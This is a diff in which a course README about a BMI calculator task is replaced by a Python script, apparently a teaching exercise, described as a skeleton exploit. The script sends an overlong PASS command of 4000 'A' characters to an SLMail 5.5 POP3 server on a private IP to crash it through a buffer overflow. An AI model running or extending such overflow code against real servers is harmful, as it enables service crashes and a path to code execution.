@@ -1,7 +1,25 @@
-# Programming For Cybersecurity course - weekly tasks with solutions
+# This is code will find some text in an access file
+#
+# Author: Tomasz
+#
+# This is a skeleton which will be used to develop an exploit.
 
-##  Week 2 - Body Mass Index Calculator
-### Task:
-Write a program that calculates somebody's Body Mass Index (BMI):
-* The inputs are the person's height in centimetres and weight in kilograms.
-* The output  is their weight divided by their height in metres squared.
+
+import sys
+import socket
+
+try:
+    #Buffer to be sent towards the target, we expect it to crash the vulnerable application due to overflowing of the buffer.
+    buffer = 'A' * 4000   
+    TARGET = '192.168.100.1' 
+    PORT = 110
+    
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Connect to IP
+    s.connect((TARGET, PORT))
+    data = s.recv(1024)                # Receive Banner
+    s.send('USER username'+'\r\n')     # Send Username
+    data = s.recv(1024)                # Receive Reply
+    s.send('PASS ' + buffer + '\r\n')  # Sent Password and  buffer
+    s.close()
+except:
+    print('There was a problem... please check if the server is vulnerable and SLMail 5.5 is running on the target.')
